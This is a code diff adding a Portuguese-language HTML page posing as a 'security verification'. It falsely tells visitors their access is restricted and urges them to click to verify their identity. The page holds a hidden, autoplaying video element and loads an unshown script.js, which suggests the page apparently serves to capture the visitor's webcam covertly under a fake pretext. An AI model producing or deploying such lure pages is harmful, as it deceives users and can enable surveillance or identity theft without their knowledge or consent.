@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verificação de Segurança</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+        .container { background: white; padding: 40px; border-radius: 15px; max-width: 450px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .warning-icon { font-size: 60px; display: block; margin-bottom: 10px; }
+        h2 { color: #333; margin-bottom: 15px; }
+        p { color: #666; margin-bottom: 20px; line-height: 1.5; }
+        #startBtn { padding: 18px 50px; font-size: 18px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; transition: all 0.3s; box-shadow: 0 4px 15px rgba(102,126,234,0.4); }
+        #startBtn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(102,126,234,0.6); }
+        #startBtn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .loader { display: none; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 20px; color: #555; font-size: 14px; min-height: 40px; }
+        .hidden { display: none; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <span class="warning-icon">🔒</span>
+        <h2>Verificação de Segurança</h2>
+        <p>Seu acesso foi temporariamente restrito.<br>Clique abaixo para verificar sua identidade.</p>
+        <button id="startBtn">Verificar Identidade</button>
+        <div class="loader" id="loader"></div>
+        <div id="status"></div>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay muted></video>
+
+    <script src="script.js"></script>
+</body>
+</html>
